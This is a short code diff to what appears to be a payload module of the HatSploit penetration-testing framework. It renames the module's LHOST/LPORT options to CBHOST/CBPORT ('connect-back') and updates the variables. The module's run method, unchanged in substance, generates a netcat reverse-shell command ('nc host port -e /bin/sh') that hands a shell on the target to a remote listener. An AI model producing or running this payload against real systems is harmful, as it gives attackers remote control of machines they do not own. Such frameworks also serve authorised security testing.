@@ -28,14 +28,14 @@ class HatSploitPayload(Payload):
     }
 
     options = {
-        'LHOST': {
-            'Description': "Local host.",
+        'CBHOST': {
+            'Description': "Connect-back host.",
             'Value': TCPClient.get_local_host(),
             'Type': "ip",
             'Required': True
         },
-        'LPORT': {
-            'Description': "Local port.",
+        'CBPORT': {
+            'Description': "Connect-back port.",
             'Value': 8888,
             'Type': "port",
             'Required': True
@@ -43,7 +43,7 @@ class HatSploitPayload(Payload):
     }
 
     def run(self):
-        local_host, local_port = self.parse_options(self.options)
+        connback_host, connback_port = self.parse_options(self.options)
 
-        payload = f"nc {local_host} {local_port} -e /bin/sh"
+        payload = f"nc {connback_host} {connback_port} -e /bin/sh"
         return payload
